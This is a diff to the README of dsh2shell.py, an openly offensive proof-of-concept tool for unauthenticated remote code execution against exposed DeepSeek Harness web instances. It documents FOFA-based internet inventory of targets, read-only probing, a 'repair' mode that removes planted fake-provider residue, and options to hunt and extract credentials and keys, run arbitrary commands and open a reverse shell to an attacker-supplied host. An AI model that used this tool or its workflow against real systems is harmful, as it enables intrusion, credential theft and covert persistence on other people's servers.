@@ -13,13 +13,6 @@ Unauthenticated RCE PoC for exposed DeepSeek Harness (dsh) web instances.
 
 ## Usage
 
-FOFA inventory and passive probing:
-
-```sh
-export FOFA_KEY='<FOFA_API_KEY>'
-python3 dsh2shell.py --fofa
-```
-
 Run one or more commands:
 
 ```sh
@@ -42,11 +35,32 @@ python3 dsh2shell.py -t https://target.example.com \
     --lhost 1.2.3.4 --raw
 ```
 
+FOFA inventory and passive probing:
+
+```sh
+export FOFA_KEY='<FOFA_API_KEY>'
+python3 dsh2shell.py --fofa
+```
+
+Probe one target read-only (reachability, default model, permission preset, provider routes, leftover-check):
+
+```sh
+python3 dsh2shell.py -t https://target.example.com --dry-run
+```
+
+Repair residue left by a killed run (leftover provider route, dummy credential, default model still pointing at the fake provider; falls back to the built-in `deepseek-official` provider when no user route remains):
+
+```sh
+python3 dsh2shell.py -t https://target.example.com --repair
+```
+
 Options:
 
 | Option | Meaning |
 |---|---|
 | `--fofa` | FOFA inventory and passive dsh/API probe |
+| `--dry-run` | Probe only: reachability, default model, preset, provider routes; changes nothing |
+| `--repair` | Remove fake-LLM residue from a killed run and reselect an existing model |
 | `--loot-keys` | Broad credential hunt with key/secret extraction (standalone or with `--cmd`) |
 | `--shell` | Open a reverse shell against one explicit target |
 | `--cmd "CMD"` | Run a command non-interactively (repeatable) |
